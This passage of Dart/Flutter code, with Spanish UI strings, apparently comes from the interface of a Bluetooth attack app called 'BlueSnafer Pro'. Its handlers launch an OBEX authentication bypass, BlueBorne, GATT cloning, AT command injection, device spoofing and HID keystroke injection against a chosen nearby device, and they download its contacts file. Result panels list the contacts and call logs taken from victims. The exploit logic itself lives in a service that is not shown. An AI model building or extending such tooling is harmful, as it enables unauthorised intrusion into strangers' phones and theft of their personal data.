    _appendLog('⏳ Testing unauthenticated OBEX access...');

    try {
      final result = await _exploitService.bypassOBEXTrust(
        _selectedDevice!['address'],
      );

      if (result['success'] == true) {
        _appendLog('✅ OBEX TRUST ABUSE! Profile: ${result['profile']}, Trust: ${result['trustLevel']}');
        if (result['dataAccessPossible'] == true) {
          _appendLog('⚠️ DATA ACCESS possible without authentication!');
        }
        _collectedData.add('🔓 [$displayName] OBEX trust abuse (${result['profile']} - ${result['trustLevel']})');
        if (mounted) {
          ScaffoldMessenger.of(context).showSnackBar(
            SnackBar(
              content: Text('🔓 OBEX auth bypass on $displayName! Profile: ${result['profile']}', style: const TextStyle(fontSize: 12)),
              backgroundColor: Colors.orange[900],
              duration: const Duration(seconds: 4),
              behavior: SnackBarBehavior.floating,
            ),
          );
        }
      } else {
        _appendLog('❌ OBEX trust abuse failed: ${result['error'] ?? result['message'] ?? 'unknown'}');
      }
    } catch (e) {
      _appendLog('💥 OBEX Trust Error: $e');
    }
  }

  // ====== NUEVOS: Advanced exploit handlers ======
  Future<void> _blueBorneAttack() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('🦠 BlueBorne → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'blueborne',
      );
      if (result['success'] == true) {
        final isVuln = result['vulnerable'] == true;
        _appendLog('✅ BlueBorne: ${result['message']}');
        _collectedData.add('🦠 [$displayName] BlueBorne: ${isVuln ? "VULNERABLE" : "Parcheado"}');
        
        // Store full structured result
        _blueBorneResults.add({
          'device': displayName,
          'address': _selectedDevice!['address'],
          'vulnerable': isVuln,
          'riskLevel': result['risk'] ?? 'UNKNOWN',
          'cves': result['cves'] ?? [],
          'exposedServices': result['exposedServices'] ?? [],
          'message': result['message'] ?? '',
          'timestamp': DateTime.now().toIso8601String(),
        });
        _saveState(); // Persist BlueBorne results
      } else {
        _appendLog('❌ BlueBorne fallido: ${result['message']}');
      }
    } catch (e) { _appendLog('💥 BlueBorne Error: $e'); }
  }

  Future<void> _mirrorProfile() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('📡 Mirror Profile → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'mirror_profile',
      );
      if (result['success'] == true) {
        final services = result['services'] as List? ?? [];
        final count = result['count'] ?? result['serviceCount'] ?? services.length;
        _appendLog('✅ Mirror: $count servicios clonados');
        _collectedData.add('📡 [$displayName] $count servicios GATT clonados');
        
        // Store full GATT tree
        _gattMirrorResults.add({
          'device': displayName,
          'address': _selectedDevice!['address'],
          'serviceCount': count,
          'services': services,
          'timestamp': DateTime.now().toIso8601String(),
        });
        _saveState(); // Persist GATT mirror results
      } else { _appendLog('❌ Mirror fallido: ${result['message']}'); }
    } catch (e) { _appendLog('💥 Mirror Error: $e'); }
  }

  Future<void> _atInjection() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('💉 AT Injection → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'at_injection',
      );
      if (result['success'] == true) {
        final msg = result['message'] ?? 'AT injection OK';
        final atResults = result['results'] as List? ?? [];
        _appendLog('✅ AT: $msg');
        _collectedData.add('💉 [$displayName] $msg');
        
        // Store AT responses
        _atInjectionResults.add({
          'device': displayName,
          'address': _selectedDevice!['address'],
          'commands': atResults,
          'message': msg,
          'timestamp': DateTime.now().toIso8601String(),
        });
        _saveState(); // Persist AT injection results
      } else { _appendLog('❌ AT fallido: ${result['message']}'); }
    } catch (e) { _appendLog('💥 AT Error: $e'); }
  }

  Future<void> _fullScan() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('🔎 Full Vuln Scan → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'full_scan',
      );
      if (result['success'] == true) {
        final risk = result['riskLevel'] ?? 'UNKNOWN';
        final vulns = result['vulnCount'] ?? 0;
        final vulnerabilities = result['vulnerabilities'] as List? ?? [];
        final sdpUuids = result['sdpUuids'] as List? ?? [];
        final gattServices = result['gattServices'] as List? ?? [];
        _appendLog('✅ Scan: $risk risk, $vulns vulns');
        _collectedData.add('🔎 [$displayName] Risk: $risk, $vulns vulnerabilities');
        
        // Store full scan results
        _fullScanResults.add({
          'device': displayName,
          'address': _selectedDevice!['address'],
          'riskLevel': risk,
          'vulnCount': vulns,
          'vulnerabilities': vulnerabilities,
          'sdpUuids': sdpUuids,
          'gattServices': gattServices,
          'obexAvailable': result['obexAvailable'] ?? false,
          'timestamp': DateTime.now().toIso8601String(),
        });
        _saveState(); // Persist full scan results
      } else { _appendLog('❌ Scan fallido: ${result['message']}'); }
    } catch (e) { _appendLog('💥 Scan Error: $e'); }
  }

  Future<void> _btSpoofing() async {
    if (_selectedDevice == null) return;
    _appendLog('🎭 BT Spoofing...');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'spoofing',
        command: 'BlueSnafer Pro',
      );
      if (result['success'] == true) {
        _appendLog('✅ Spoofing OK');
      } else { _appendLog('❌ Spoofing fallido'); }
    } catch (e) { _appendLog('💥 Spoofing Error: $e'); }
  }

  Future<void> _hidInject() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('⌨️ HID Inject → $displayName');
    try {
      final result = await _exploitService.executeAttack(
        deviceAddress: _selectedDevice!['address'],
        type: 'hid_inject',
      );
      if (result['success'] == true) {
        _appendLog('✅ HID injection OK');
        _collectedData.add('⌨️ [$displayName] Keystroke injected');
      } else { _appendLog('❌ HID fallido'); }
    } catch (e) { _appendLog('💥 HID Error: $e'); }
  }

  Future<void> _downloadFile() async {
    if (_selectedDevice == null) return;
    final displayName = device_utils.getDeviceDisplayName(_selectedDevice!);
    _appendLog('📥 Download file...');
    try {
      final result = await _exploitService.downloadFile(
        _selectedDevice!['address'],
        'contacts.vcf',
      );
      if (result['success'] == true) {
        final path = result['path'] ?? result['fileName'] ?? 'saved';
        final size = result['size'] ?? 0;
        _appendLog('✅ Download OK: $path ($size bytes)');
        _collectedData.add('📥 [$displayName] Archivo descargado: $path ($size bytes)');
        _saveState();
        
        // Show user-friendly confirmation
        if (mounted) {
          showDialog(
            context: context,
            builder: (context) => AlertDialog(
              title: const Text('✅ Descarga completada'),
              content: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text('Archivo: ${result['fileName'] ?? 'contacts.vcf'}'),
                  const SizedBox(height: 4),
                  Text('Tamaño: $size bytes'),
                  const SizedBox(height: 8),
                  const Text('📁 Ubicación: Carpeta Descargas del dispositivo', style: TextStyle(color: Colors.white60, fontSize: 12)),
                ],
              ),
              actions: [
                TextButton(onPressed: () => Navigator.pop(context), child: const Text('OK')),
              ],
            ),
          );
        }
      } else { 
        _appendLog('❌ Download fallido: ${result['message']}'); 
      }
    } catch (e) { _appendLog('💥 Download Error: $e'); }
  }

  // ========== UI BUILDERS ==========

  Widget _buildExploitCard(String title, String subtitle, IconData icon, Color color, VoidCallback? onTap) {
    return Card(
      child: ListTile(
        leading: Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(12)),
          child: Icon(icon, color: color, size: 24),
        ),
        title: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis),
        subtitle: Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10)),
        trailing: onTap != null
            ? Container(
                padding: const EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: color.withOpacity(0.1),
                  borderRadius: BorderRadius.circular(100),
                  border: Border.all(color: color.withOpacity(0.5)),
                ),
                child: Icon(Icons.bolt, color: color, size: 16),
              )
            : null,
        onTap: onTap,
      ),
    );
  }

  Widget _buildSDPResultsPanel() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.cyan[900]!.withOpacity(0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.cyanAccent.withOpacity(0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.search, color: Colors.cyanAccent, size: 16),
              const SizedBox(width: 8),
              Text('${_sdpServices.length} servicios descubiertos', style: const TextStyle(color: Colors.cyanAccent, fontWeight: FontWeight.bold, fontSize: 12)),
            ],
          ),
          const SizedBox(height: 8),
          ..._sdpServices.take(15).map((s) => Padding(
            padding: const EdgeInsets.only(bottom: 2),
            child: Row(
              children: [
                Icon(Icons.bluetooth, color: Colors.cyanAccent, size: 10),
                const SizedBox(width: 4),
                Expanded(
                  child: Text(
                    s['serviceName']?.toString() ?? 'Unknown',
                    style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'),
                    overflow: TextOverflow.ellipsis,
                  ),
                ),
                Text(
                  (s['uuid']?.toString() ?? '').substring(0, 8),
                  style: const TextStyle(color: Colors.white38, fontSize: 9, fontFamily: 'monospace'),
                ),
              ],
            ),
          )),
          if (_sdpServices.length > 15)
            Padding(
              padding: const EdgeInsets.only(top: 4),
              child: Text('... y ${_sdpServices.length - 15} mas', style: const TextStyle(color: Colors.white38, fontSize: 9)),
            ),
        ],
      ),
    );
  }

  Widget _buildPBAPResultsPanel() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.orange[900]!.withOpacity(0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.orangeAccent.withOpacity(0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          if (_pbapContacts.isNotEmpty) ...[
            Row(
              children: [
                Icon(Icons.contacts, color: Colors.orangeAccent, size: 16),
                const SizedBox(width: 8),
                Text('${_pbapContacts.length} contactos extraidos', style: const TextStyle(color: Colors.orangeAccent, fontWeight: FontWeight.bold, fontSize: 12)),
              ],
            ),
            const SizedBox(height: 8),
            ..._pbapContacts.take(10).map((c) => Padding(
              padding: const EdgeInsets.only(bottom: 2),
              child: Row(
                children: [
                  Icon(Icons.person, color: Colors.orangeAccent, size: 10),
                  const SizedBox(width: 4),
                  Expanded(
                    child: Text(
                      c['name']?.toString() ?? c['phone']?.toString() ?? '?',
                      style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                  if (c['phone'] != null)
                    Text(c['phone']!, style: const TextStyle(color: Colors.white38, fontSize: 9)),
                ],
              ),
            )),
            if (_pbapContacts.length > 10)
              Padding(
                padding: const EdgeInsets.only(top: 4),
                child: Text('... y ${_pbapContacts.length - 10} mas', style: const TextStyle(color: Colors.white38, fontSize: 9)),
              ),
            const SizedBox(height: 12),
          ],
          if (_pbapCalls.isNotEmpty) ...[
            Row(
              children: [
                Icon(Icons.phone, color: Colors.deepOrange, size: 16),
                const SizedBox(width: 8),
                Text('${_pbapCalls.length} llamadas extraidas', style: const TextStyle(color: Colors.deepOrange, fontWeight: FontWeight.bold, fontSize: 12)),
              ],
            ),
            const SizedBox(height: 8),
            ..._pbapCalls.take(10).map((c) => Padding(
              padding: const EdgeInsets.only(bottom: 2),
              child: Row(
                children: [
                  Icon(
                    c['type'] == 'incoming' ? Icons.call_received :
                    c['type'] == 'outgoing' ? Icons.call_made :
                    Icons.call_missed,
                    color: Colors.deepOrange, size: 10,
                  ),
                  const SizedBox(width: 4),
                  Expanded(
                    child: Text(
                      c['name']?.toString() ?? c['phone']?.toString() ?? '?',
                      style: const TextStyle(color: Colors.white70, fontSize: 10, fontFamily: 'monospace'),
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                  if (c['phone'] != null)
                    Text(c['phone']!, style: const TextStyle(color: Colors.white38, fontSize: 9)),
                  if (c['datetime'] != null)
                    Padding(
                      padding: const EdgeInsets.only(left: 4),
                      child: Text(c['datetime']!, style: const TextStyle(color: Colors.white38, fontSize: 8)),
                    ),
                ],
              ),
            )),
            if (_pbapCalls.length > 10)
              Padding(
                padding: const EdgeInsets.only(top: 4),
                child: Text('... y ${_pbapCalls.length - 10} mas', style: const TextStyle(color: Colors.white38, fontSize: 9)),
              ),
          ],
        ],
      ),
    );
  }

  Widget _buildSectionTitle(String title, String subtitle) {
    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [Text(title, style: const TextStyle(color: Colors.indigoAccent, fontSize: 16, fontWeight: FontWeight.bold, letterSpacing: 1)), Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10, fontFamily: 'monospace')), const SizedBox(height: 12), Container(height: 1, color: Colors.white.withOpacity(0.05))]);
  }

  Widget _buildAttackCard(String title, String subtitle, Color color, VoidCallback onTap, {String? type}) {
    double prob = 0.5;
    bool recommended = false;
    if (type != null && _successRates.containsKey(type)) prob = _successRates[type]!;
    if (_currentSuggestion != null && type == _currentSuggestion!.type) recommended = true;
    final bool isViable = prob > 0.2;

    return Opacity(
      opacity: isViable ? 1.0 : 0.4,
      child: Container(
        margin: const EdgeInsets.only(bottom: 12),
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(16),
          boxShadow: recommended ? [BoxShadow(color: Colors.cyanAccent.withOpacity(0.1), blurRadius: 8, spreadRadius: 1)] : null,
        ),
        child: Card(
          margin: EdgeInsets.zero,
          child: ListTile(
            contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
            title: Row(children: [
              Expanded(child: Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13), maxLines: 1, overflow: TextOverflow.ellipsis)),
              if (recommended) ...[const SizedBox(width: 8), Container(padding: const EdgeInsets.symmetric(horizontal: 6, vertical: 2), decoration: BoxDecoration(color: Colors.cyanAccent.withOpacity(0.2), borderRadius: BorderRadius.circular(4)), child: const Text('ÓPTIMO', style: TextStyle(color: Colors.cyanAccent, fontSize: 8, fontWeight: FontWeight.bold)))]
            ]),
            subtitle: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                const SizedBox(height: 4),
                Text(subtitle, style: const TextStyle(color: Colors.white24, fontSize: 10)),
                const SizedBox(height: 8),
                Row(children: [
                  Expanded(child: ClipRRect(borderRadius: BorderRadius.circular(2), child: LinearProgressIndicator(value: prob, backgroundColor: Colors.white.withOpacity(0.05), valueColor: AlwaysStoppedAnimation<Color>(prob > 0.7 ? Colors.greenAccent : (prob > 0.4 ? Colors.cyanAccent : Colors.white30)), minHeight: 4))),
                  const SizedBox(width: 8),
                  Text(
                    '${(prob * 100).toInt()}%',
                    style: const TextStyle(color: Colors.white38, fontSize: 10, fontWeight: FontWeight.bold),
                  ),
                ]),
              ],
            ),
            trailing: Container(padding: const EdgeInsets.all(8), decoration: BoxDecoration(color: color.withOpacity(0.1), borderRadius: BorderRadius.circular(100), border: Border.all(color: color.withOpacity(recommended ? 0.8 : 0.2))), child: Icon(Icons.bolt, color: color, size: 16)),
            onTap: _selectedDevice == null ? null : (isViable ? onTap : null),
          ),
        ),
      ),
    );
  }

  Widget _buildAiModelCard(String title, String subtitle, String status) {
    return Card(
      margin: const EdgeInsets.only(bottom: 10),
      child: Padding(
        padding: const EdgeInsets.all(16),
        child: Row(
          children: [
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(title, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 12)),
                  Text(subtitle, style: const TextStyle(color: Colors.white54, fontSize: 10, fontFamily: 'monospace')),
                ],
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
              decoration: BoxDecoration(
                color: Colors.greenAccent.withOpacity(0.1),
                borderRadius: BorderRadius.circular(8),
                border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
              ),
              child: Text(status, style: const TextStyle(color: Colors.greenAccent, fontSize: 10, fontWeight: FontWeight.bold)),
            ),
          ],
        ),
      ),
    );
  }

  // ====== RESULTS DASHBOARD ======
  bool _hasResults() {
    return _sdpServices.isNotEmpty || _obexFiles.isNotEmpty || 
           _pbapContacts.isNotEmpty || _pbapCalls.isNotEmpty ||
           _blueBorneResults.isNotEmpty || _gattMirrorResults.isNotEmpty ||
           _fullScanResults.isNotEmpty || _atInjectionResults.isNotEmpty;
  }

  Widget _buildResultsDashboard() {
    return Container(
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: Colors.green[900]!.withOpacity(0.2),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: Colors.greenAccent.withOpacity(0.3)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            children: [
              Icon(Icons.storage, color: Colors.greenAccent, size: 16),
              const SizedBox(width: 8),
              const Text('DATOS EXTRAÍDOS', style: TextStyle(color: Colors.greenAccent, fontWeight: FontWeight.bold, fontSize: 12)),
            ],
          ),
          const SizedBox(height: 8),
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: [
              if (_sdpServices.isNotEmpty) _buildResultChip('🔍 SDP', _sdpServices.length),
              if (_obexFiles.isNotEmpty) _buildResultChip('📂 OBEX', _obexFiles.length),
              if (_pbapContacts.isNotEmpty) _buildResultChip('📇 Contactos', _pbapContacts.length),
              if (_pbapCalls.isNotEmpty) _buildResultChip('📞 Llamadas', _pbapCalls.length),
              if (_blueBorneResults.isNotEmpty) _buildResultChip('🦠 BlueBorne', _blueBorneResults.length),
              if (_gattMirrorResults.isNotEmpty) _buildResultChip('📡 GATT', _gattMirrorResults.length),
              if (_fullScanResults.isNotEmpty) _buildResultChip('🔎 Scan', _fullScanResults.length),
              if (_atInjectionResults.isNotEmpty) _buildResultChip('💉 AT', _atInjectionResults.length),
            ],
          ),
          if (_blueBorneResults.isNotEmpty) ...[
            const SizedBox(height: 8),
            const Text('Último BlueBorne:', style: TextStyle(color: Colors.white60, fontSize: 10)),
            Text(_blueBorneResults.last['vulnerable'] == true ? '⚠️ VULNERABLE' : '✅ Parcheado',
              style: TextStyle(color: _blueBorneResults.last['vulnerable'] == true ? Colors.redAccent : Colors.greenAccent, fontSize: 11, fontWeight: FontWeight.bold)),
          ],
          if (_fullScanResults.isNotEmpty) ...[
            const SizedBox(height: 4),
            const Text('Último Scan:', style: TextStyle(color: Colors.white60, fontSize: 10)),
            Text('Riesgo: ${_fullScanResults.last['riskLevel']} (${_fullScanResults.last['vulnCount']} vulns)',
              style: const TextStyle(color: Colors.white70, fontSize: 11)),
          ],
          if (_pbapContacts.isNotEmpty) ...[
            const SizedBox(height: 4),
            const Text('Contactos:', style: TextStyle(color: Colors.white60, fontSize: 10)),
            Text('${_pbapContacts.length} contactos extraídos', style: const TextStyle(color: Colors.cyanAccent, fontSize: 11)),
          ],
        ],
      ),
    );
  }

  Widget _buildResultChip(String label, int count) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
      decoration: BoxDecoration(
        color: Colors.white10,
        borderRadius: BorderRadius.circular(12),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Text(label, style: const TextStyle(color: Colors.white70, fontSize: 10)),
          const SizedBox(width: 4),
          Text('$count', style: const TextStyle(color: Colors.greenAccent, fontSize: 10, fontWeight: FontWeight.bold)),
        ],
      ),
    );
  }
}
